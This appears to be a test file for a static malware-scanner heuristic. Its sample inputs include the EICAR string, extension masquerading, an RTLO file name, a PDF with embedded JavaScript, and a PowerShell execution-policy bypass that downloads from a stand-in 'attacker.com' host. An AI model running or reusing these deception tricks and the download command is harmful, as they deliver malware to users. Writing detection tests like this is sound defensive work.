import { analyzeFile } from './utils/heuristics.js';

const testCases = [
  {
    name: 'Safe Plaintext File',
    filename: 'readme.txt',
    buffer: Buffer.from('This is a simple text file with standard content. No malicious patterns here.'),
  },
  {
    name: 'EICAR Test Signature',
    filename: 'eicar.txt',
    buffer: Buffer.from('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'),
  },
  {
    name: 'Extension Masquerading (PE file with PNG name)',
    filename: 'image.png',
    buffer: Buffer.from('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00this is a PE header test payload'),
  },
  {
    name: 'Double Extension Threat',
    filename: 'invoice.pdf.exe',
    buffer: Buffer.from('Some standard payload content'),
  },
  {
    name: 'Right-to-Left Override (RTLO) Threat',
    filename: 'report_\u202eexet.txt', // actually report_txt.exe when rendered in windows
    buffer: Buffer.from('Some binary shellcode here'),
  },
  {
    name: 'PDF Exploit Heuristic (Embedded Javascript)',
    filename: 'document.pdf',
    buffer: Buffer.from('%PDF-1.4 ... /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R ... /JS /JavaScript (app.alert("malware"))'),
  },
  {
    name: 'Powershell Execution Bypass Script',
    filename: 'payload.ps1',
    buffer: Buffer.from('powershell.exe -ExecutionPolicy Bypass -File http://attacker.com/malware.exe -DownloadFile'),
  }
];

function runTests() {
  console.log('=== RUNNING STATIC HEURISTICS SCANNER TESTS ===\n');
  let passed = 0;

  testCases.forEach((tc, idx) => {
    console.log(`[Test #${idx + 1}] ${tc.name}`);
    console.log(`Filename: "${tc.filename}"`);
    console.log(`Buffer size: ${tc.buffer.length} bytes`);
    
    const start = performance.now();
    const result = analyzeFile(tc.buffer, tc.filename);
    const duration = (performance.now() - start).toFixed(3);

    console.log(`Result: ${result.isMalicious ? 'Malicious ⚠️' : 'Safe ✅'} | Score: ${result.score}/100 | Confidence: ${result.confidence}%`);
    console.log(`Entropy: ${result.entropy} | Magic Format: ${result.magicType}`);
    console.log(`Time: ${duration} ms`);
    if (result.flags.length > 0) {
      console.log('Flags triggered:');
      result.flags.forEach(flag => console.log(`  - ${flag}`));
    } else {
      console.log('Flags: None');
    }
    console.log('-'.repeat(50));

    // Basic assertions
    if (tc.name === 'Safe Plaintext File') {
      if (!result.isMalicious) passed++;
    } else {
      if (result.isMalicious) passed++;
    }
  });

  console.log(`\n=== TEST RUN SUMMARY ===`);
  console.log(`Passed: ${passed}/${testCases.length}`);
  if (passed === testCases.length) {
    console.log('SUCCESS: All test assertions passed successfully!');
  } else {
    console.error('FAILURE: Some assertions failed.');
  }
}

runTests();
